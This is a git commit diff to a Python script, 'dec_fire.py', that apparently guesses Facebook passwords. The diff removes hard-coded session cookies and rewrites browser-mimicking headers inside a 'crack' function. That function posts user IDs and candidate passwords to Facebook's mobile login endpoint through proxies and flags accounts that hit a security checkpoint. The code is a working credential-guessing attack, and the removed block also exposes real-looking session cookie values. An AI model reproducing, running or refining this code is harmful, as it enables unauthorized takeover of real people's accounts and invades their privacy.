06c616100caebc717ad0681d600bc208443756ab
rawagaming <161049728+rawagaming@users.noreply.github.com>
2024-03-23 13:26:23 -0700

    Update dec_fire.py

--- dec_fire.py
+++ dec_fire.py
@@ -45,49 +45,10 @@ os.system('clear')
 from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
-
 import time, datetime, os
 from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
-
-cookies = {
-    'datr': '2yX5ZB5E4uhXtEkX2oTQoLUc',
-    'sb': '2yX5ZOiBHv1Pm7IM7x2ZPwJv',
-    'locale': 'en_US',
-    'vpd': 'v1%3B783x393x2.75',
-    'wl_cbv': 'v2%3Bclient_version%3A2321%3Btimestamp%3A1694157862',
-    'm_pixel_ratio': '2.75',
-    'wd': '393x783',
-    'fr': '0UTKDcTVUykZ9IizK.AWX5ZyeAloIUIp_57x9kcB4CY2I.Bk-SXb.mM.AAA.0.0.Bk-sxE.AWW6_JyhXPY',}
-
-headers = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=2yX5ZB5E4uhXtEkX2oTQoLUc; sb=2yX5ZOiBHv1Pm7IM7x2ZPwJv; locale=en_US; vpd=v1%3B783x393x2.75; wl_cbv=v2%3Bclient_version%3A2321%3Btimestamp%3A1694157862; m_pixel_ratio=2.75; wd=393x783; fr=0UTKDcTVUykZ9IizK.AWX5ZyeAloIUIp_57x9kcB4CY2I.Bk-SXb.mM.AAA.0.0.Bk-sxE.AWW6_JyhXPY',
-    'dpr': '2.75',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"22101320G"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-
-response = requests.get(
-    'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-    cookies=cookies,
-    headers=headers,
-)
 import urllib3,rich,base64
 from rich.table import Table as me
 from rich.console import Console as sol
@@ -422,7 +383,31 @@ def crack(idf,pwv):
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			heade={'authority': 'm.facebook.com',
+    'method': 'GET',
+	'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'content-type':'application/x-www-form-urlencoded',
+    'origin':'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				statuscp = f'''
